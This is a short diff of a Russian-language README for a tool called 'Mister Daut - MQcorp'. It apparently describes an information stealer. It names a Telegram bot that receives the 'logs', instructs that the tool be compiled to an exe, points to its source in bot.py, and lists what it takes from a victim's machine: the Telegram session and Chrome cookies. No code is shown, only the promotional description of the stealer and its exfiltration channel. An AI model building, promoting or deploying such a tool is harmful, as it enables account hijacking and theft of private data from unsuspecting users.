@@ -4,13 +4,14 @@
 
 Mister Daut - MQcorp 
 
-**Бот для получения логов: https://t.me/@misterdautbot**
+Логи: https://t.me/@misterdautbot
 
 _**Необходимо компилировать в exe!**_
 
-**Сам софт находится в Mister Daut/bot.py **
+*Сам софт находится в Mister Daut/bot.py *
 
 Что себе позволяет:
+
 Телеграмм сессия
 
 Куки с Chrome
